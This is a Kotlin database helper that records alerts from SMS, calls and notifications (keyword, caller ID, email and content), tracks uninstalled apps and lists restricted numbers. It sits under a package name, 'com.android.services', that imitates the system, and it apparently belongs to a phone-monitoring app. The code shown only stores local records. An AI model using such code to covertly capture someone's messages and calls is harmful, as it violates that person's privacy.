package com.android.services.util

import android.content.Context
import com.android.services.db.entities.*
import com.android.services.models.NotificationAlert
import com.android.services.models.SmsCallAlert
import com.android.services.models.UninstalledApp
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import org.greenrobot.eventbus.EventBus

object RoomDBUtils {

    fun addTextAlertEvent(
        context: Context,
        textAlert: TextAlert,
        smsCallAlert: SmsCallAlert? = null,
        notificationAlert: NotificationAlert? = null
    ) {

        val alertContent = if (notificationAlert == null) {
            GsonBuilder().create().toJson(smsCallAlert, SmsCallAlert::class.java)
        } else {
            GsonBuilder().create().toJson(notificationAlert, NotificationAlert::class.java)
        }

        val textAlertEvent = TextAlertEvent()
        textAlertEvent.also {
            it.alertId = textAlert.alertId
            it.category = textAlert.category
            it.eventThrough = textAlert.eventThrough
            it.type = textAlert.type
            it.keyword = textAlert.keyword
            it.callerId = textAlert.callerId
            it.email = textAlert.email
            it.alertContent = alertContent
            it.date = AppUtils.getDate(System.currentTimeMillis())
            it.status = 0
        }
        InjectorUtils.provideTextAlertEventRepository(context).insertTextAlert(textAlertEvent)
        logVerbose("${AppConstants.TEXT_ALERT_TYPE} text alert event saved = $textAlertEvent")
    }

    @JvmStatic
    fun getUninstalledAppsList(context: Context): List<UninstalledApp> =
        InjectorUtils.provideInstalledAppsRepository(context).getUninstallAppsList()

    fun setAppsAsUninstalled(context: Context, packageName: String) =
        InjectorUtils.provideInstalledAppsRepository(context).setAppAsUninstalled(packageName)

    fun deleteInstalledApps(context: Context, packageName: String) {
        InjectorUtils.provideInstalledAppsRepository(context).delete(packageName)
    }

    @JvmStatic
    fun getRestrictedNumberList(context: Context): List<String> {
        return InjectorUtils.provideRestrictedCallRepository(context).selectRestrictedCalls()
    }
}